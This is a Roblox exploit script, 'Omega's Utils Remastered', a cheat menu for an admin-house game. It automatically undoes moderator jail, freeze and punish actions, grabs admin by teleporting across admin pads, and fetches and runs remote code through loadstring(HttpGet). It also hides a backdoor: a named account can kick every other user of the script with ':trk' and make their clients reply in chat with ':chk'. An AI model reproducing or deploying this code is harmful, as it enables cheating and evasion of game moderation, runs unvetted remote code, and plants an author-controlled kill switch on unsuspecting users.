local camera = game.Workspace.CurrentCamera
local Players = game.Players
local Player = game.Players.LocalPlayer
Instance.new ("Part",game.Workspace.Camera)
workspace.CurrentCamera.CameraSubject = game.Workspace.Camera.Part
game.Chat.BubbleChatEnabled = false
local safe = CFrame.new(93486234289567190, 123490821468906714000, 134891670418940198908)
local ann = false

say = function(Message)
    game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(Message,"all")
end

coroutine.wrap(function()
for i,descendant in game.Workspace:GetDescendants() do
	if descendant.ClassName == 'Humanoid' then
        descendant:GetPropertyChangedSignal('DisplayName'):Connect(function()
	    task.wait()
            if #descendant.DisplayName>50 then
                descendant.DisplayName = 'Omega is daddy'
            end
        end)
        if #descendant.DisplayName>50 then
            descendant.DisplayName = 'kek'
        end
    elseif descendant.Name=='Mesh' or descendant.Name=='SpecialMesh' or descendant.ClassName=='ParticleEmitter' or descendant.ClassName=='Smoke' or descendant.ClassName=='Fire' or descendant.ClassName=='Sparkles' then
        if descendant.Parent.Name~='Head' and descendant.Parent.Name~='Handle' then
            if not descendant:IsDescendantOf(Workspace.SecureParts) then
                task.wait()
                descendant:Destroy()
            end
        end
    end
end
end)()
game.Chat.BubbleChatEnabled = false
coroutine.wrap(function()
for i,Child in Players:GetChildren() do
	if Child.Name == '0lxad' then
		print("Daddy found!")
		local Daddy = Child
		Daddy.Chatted:Connect(function(msg)
    		if string.lower(string.split(msg, ' ')[1]) == ":trk" then
      			if Player.Name == '0lxad' then print("Skids kicked")
      			else
        		local kmsg = string.split(msg, ':trk')[1]
            	Player:Kick(kmsg)
      			end
    		end
		end)
        Daddy.Chatted:Connect(function(msg)
            if string.lower(msg) == ":chk" then
                say('I am!')
			end
        end)
	end
end
end)()
local function onDescendantAdded(descendant)
	if descendant.Name == 'Grass' then
		task.wait()
		descendant:Destroy()
	end
	if descendant.ClassName == 'Humanoid' then
        if #descendant.DisplayName>50 then
            descendant.DisplayName = 'afvk#0'
        end
        descendant:GetPropertyChangedSignal('DisplayName'):Connect(function()
            if #descendant.DisplayName>50 then
                descendant.DisplayName = 'Pwned by Cizz'
            end
        end)
    elseif descendant.Name=='Mesh' or descendant.Name=='SpecialMesh' or descendant.ClassName=='ParticleEmitter' or descendant.ClassName=='Smoke' or descendant.ClassName=='Fire' or descendant.ClassName=='Sparkles' then
        if descendant.Parent.Name~='Head' and descendant.Parent.Name~='Handle' then
            if not descendant:IsDescendantOf(Workspace.SecureParts) then
                task.wait()
                descendant:Destroy()
            end
        end
    elseif descendant.ClassName == 'SkateboardPlatform' then
        descendant.CFrame = safe
        descendant:GetPropertyChangedSignal('Position'):Connect(function()
            descendant.CFrame = safe
        end)
    elseif descendant.ClassName == 'Part' then
        task.wait()
        coroutine.wrap(function()
            if descendant.BackSurface == Enum.SurfaceType.Hinge then 
                descendant.BackSurface = Enum.SurfaceType.Smooth
            end
            if descendant.FrontSurface == Enum.SurfaceType.Hinge then
                descendant.FrontSurface = Enum.SurfaceType.Smooth
            end
            if descendant.BottomSurface == Enum.SurfaceType.Hinge then
                descendant.BottomSurface = Enum.SurfaceType.Smooth
            end
            if descendant.LeftSurface == Enum.SurfaceType.Hinge then
                descendant.LeftSurface = Enum.SurfaceType.Smooth
            end
            if descendant.RightSurface == Enum.SurfaceType.Hinge then 
                descendant.RightSurface = Enum.SurfaceType.Smooth
            end
            if descendant.TopSurface == Enum.SurfaceType.Hinge then
                descendant.TopSurface = Enum.SurfaceType.Smooth
            end
        end)()
    end
end

Players.PlayerAdded:Connect(function(plr)
	if plr.Name == '0lxad' then
		print("Daddy found!")
		local Daddy = plr
		Daddy.Chatted:Connect(function(msg)
    		if string.lower(string.split(msg, ' ')[1]) == ":trk" then
      			if Player.Name == '0lxad' then print("Skids kicked")
      			else
        		local kmsg = string.split(msg, ':trk')[1]
            	Player:Kick(kmsg)
      			end
    		end
		end)
        Daddy.Chatted:Connect(function(msg)
            if string.lower(msg) == ":chk" then
                say('I am!')
			end
        end)
	end
end)
workspace.Camera:GetPropertyChangedSignal('FieldOfView'):Connect(function()
    if workspace.Camera.FieldOfView ~= 70 then
        workspace.Camera.FieldOfView = 70
    end
end)
workspace.DescendantAdded:Connect(onDescendantAdded)

say("OwO, What's this? :3")
wait(5)
camera.CameraSubject = Player.Character
game.Chat.BubbleChatEnabled = false
local httpservice = game:GetService('HttpService')

_G.noice = false
_G.nojail = false
_G.nofling = false
_G.nopunish = false
_G.perm = false
rchat = function(Message)
  Players:Chat(Message)
end
local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/deeeity/mercury-lib/master/src.lua"))()
local GUI = Mercury:Create{
    Name = "Omega",
    Size = UDim2.fromOffset(600, 400),
    Theme = Mercury.Themes.Dark,
    Link = "https://roblox.com/Admin-House"
}
local Tab = GUI:Tab{
	Name = "Anti's",
	Icon = "rbxassetid://8569322835"
}
Tab:Toggle{
	Name = "Anti-Freeze/Ice (requires admin)",
	StartingState = false,
	Description = "Hi?",
	Callback = function(state)
		_G.noice = state
		if state then
    	if Player.Character.HumanoidRootPart.Anchored then
    		rchat(':thaw')
    	end
		end
		GUI:Notification{
			Title = "Omega's Utils Remastered",
			Text = ("Anti-Freeze "..tostring(state)),
			Duration = 8,
			Callback = function() end
		}
	end
}

Tab:Toggle{
	Name = "Anti-Jail (requires admin)",
	StartingState = false,
	Description = "What do you think it does???",
	Callback = function(state)
		_G.nojail = state
		if state then
		if workspace:FindFirstChild(Player.Name.."_ADONISJAIL") then
    	rchat(':free')
		end
		end
		GUI:Notification{
			Title = "Omega's Utils Remastered",
			Text = ("Anti-Jail "..tostring(state)),
			Duration = 8,
			Callback = function() end
		}
	end
}

Tab:Toggle{
	Name = "Anti-Punish (requires admin)",
	StartingState = false,
	Description = "It works?",
	Callback = function(state)
		_G.nopunish = state
		if state then
		if Player.Character.Parent == game.Lighting or Player.Character.Parent.ClassName == 'Model' then
			rchat(':unpunish') 
    	end
		end
		GUI:Notification{
			Title = "Omega's Utils Remastered",
			Text = ("Anti-Punish "..tostring(state)),
			Duration = 8,
			Callback = function() end
		}
	end
}

local Tab = GUI:Tab{
	Name = "Utils",
	Icon = "rbxassetid://8569322835"
}

Tab:Textbox{
	Name = "Loadb",
	Callback = function(text)
	game:GetService("ReplicatedStorage").Network.BuildSaving:InvokeServer({"LOAD", text})
 end
}

Tab:Toggle{
	Name = "Permanent Admin (for non perms)",
	StartingState = false,
	Description = "Tp to pads when no admin",
	Callback = function(state)
		_G.perm = state
		if state then
            if not workspace.SecureParts.AdminPads:FindFirstChild(Player.Name.."'s admin") then
                local pos = Player.Character.HumanoidRootPart.Position
                for i,v in workspace.SecureParts.AdminPads:GetChildren() do
                    Player.Character.HumanoidRootPart.CFrame = CFrame.new(v.Head.Position)
                end
                task.wait(0.5)
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
            end
		end
		GUI:Notification{
			Title = "Omega's Utils Remastered",
			Text = ("Perm is "..tostring(state)),
			Duration = 8,
			Callback = function() end
		}
	end
}
GUI:Credit{
	Name = "Cizz/Omega",
	Description = "Made the script",
	V3rm = nil,
	Discord = "afvk/0megaa."
}

GUI:Credit{
	Name = "Lucid",
	Description = "Is my guy",
	V3rm = nil,
	Discord = "1ucd"
}

GUI:Credit{
	Name = "Iconic",
	Description = "Cool",
	V3rm = nil,
	Discord = "just_iconic"
}

Player.CharacterAdded:Connect(function(char)
	char:GetPropertyChangedSignal('Parent'):Connect(function()
	if _G.nopunish then
		task.wait()
		if char.Parent == game.Lighting or char.Parent.ClassName == 'Model' then
			task.wait()
			rchat(':unpunish') 
    	end
	end
	end)
	char:WaitForChild("HumanoidRootPart"):GetPropertyChangedSignal('Anchored'):Connect(function()
	if _G.noice then
		if char.HumanoidRootPart.Anchored then
			task.wait()
			rchat(":thaw")
		end
	end
	end)
end)

workspace.DescendantAdded:Connect(function(descendant)
	if _G.nojail then
	if descendant.Name == (Player.Name..'_ADONISJAIL') then
		task.wait()
		rchat(":Free")
	end
	end
end)

workspace.SecureParts.ResetPads.ClickDetector:GetPropertyChangedSignal('MaxActivationDistance'):Connect(function()
    if _G.perm then
    local pos = Player.Character.HumanoidRootPart.Position
        if workspace.SecureParts.ResetPads.ClickDetector.MaxActivationDistance == 0 then
            for i,v in workspace.SecureParts.AdminPads:GetChildren() do
                Player.Character.HumanoidRootPart.CFrame = CFrame.new(v.Head.Position)
            end
            task.wait(0.5)
            Player.Character.HumanoidRootPart.CFrame = CFrame.new(pos)
        end
    end
end)
GUI:Notification{
	Title = "Omega's Utils Remastered",
	Text = "Welcome to OU:R (Alpha)",
	Duration = 8,
	Callback = function() end
}
